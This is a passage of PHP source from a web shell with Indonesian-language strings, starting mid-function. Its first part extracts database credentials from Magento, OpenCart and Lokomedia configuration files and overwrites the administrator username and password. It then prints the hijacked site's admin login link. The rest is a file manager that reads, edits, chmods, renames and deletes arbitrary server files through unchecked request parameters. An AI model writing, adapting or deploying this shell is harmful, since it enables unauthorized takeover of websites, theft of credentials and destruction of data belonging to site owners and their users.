          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/Magento|Mage_Core/",$config)) {
        $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
        $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
        $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
        $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
        $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
        $prefix = $dbprefix."admin_user";
        $option = $dbprefix."core_config_data";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[value];
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "CMS: Magento<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
        $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
        $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
        $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"'DB_DATABASE', '","'");
        $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
        $prefix = $dbprefix."user";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $target = ambilkata($config,"HTTP_SERVER', '","'");
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "CMS: OpenCart<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
        $dbhost = ambilkata($config,'server = "','"');
        $dbuser = ambilkata($config,'username = "','"');
        $dbpass = ambilkata($config,'password = "','"');
        $dbname = ambilkata($config,'database = "','"');
        $prefix = "users";
        $option = "identitas";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
        $result = mysql_fetch_array($q);
        $target = $result[alamat_website];
        if($target == '') {
          $target2 = $result[url];
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          if($target2 == '') {
            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $cek_login3 = file_get_contents("$target2/adminweb/");
            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
              $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
              $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
            } else {
              $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
            }
          }
        } else {
          $cek_login = file_get_contents("$target/adminweb/");
          $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
          if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
          } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
          } else {
            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
          }
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE level='admin'");
        echo "CMS: Lokomedia<br>";
        if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
          echo $url_target2;
        } else {
          echo $url_target;
        }
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      }
    }
  }     
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}
elseif(isset($_GET['filesrc'])){
	echo "<tr><td>";
	echo '</tr></td></table><br />';
	echo "<textarea cols=80 rows=20 name='src'>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea><br />";
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Success</font><br/>';
}else{
echo '<font color="red">Denied</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div><table width="700" class="content" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Permission</center></th>
<th><center>Action</center></th>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<br><br><hr color="Red"><br><center>Copyright &copy '.date("Y").' <a href="https://google.com" target="_blank">Vijune15</a> - <a href="https://www.facebook.com/Will_never_Die" target="_blank">Will Never Die</a></center>
</body>
</html>';
?>